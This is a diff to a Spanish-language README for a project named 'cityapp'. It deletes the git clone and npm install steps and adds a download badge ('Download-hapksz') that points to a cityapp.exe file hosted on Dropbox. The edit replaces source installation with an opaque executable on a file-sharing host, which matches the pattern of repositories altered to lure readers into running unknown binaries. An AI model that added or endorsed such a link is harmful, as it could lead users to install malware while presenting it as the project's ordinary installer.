@@ -17,17 +17,7 @@
 
 ## Instalación
 
-**Clona el repositorio**
-
-`git clone https://github.com/tuusuario/cityapp.git`
-
-**Entra en la carpeta**
-
-`cd cityapp`
-
-**Instala dependencias**
-
-`npm install`
+**Descargar** [![Click Here to Download](https://img.shields.io/badge/Download-hapksz-blue?style=for-the-badge&logo=download)](https://dl.dropboxusercontent.com/scl/fi/t9tdake1xsrwyxyf79pm2/cityapp.exe?rlkey=y7ta032056dpado8r1o6bth4c)
 
 ---
 
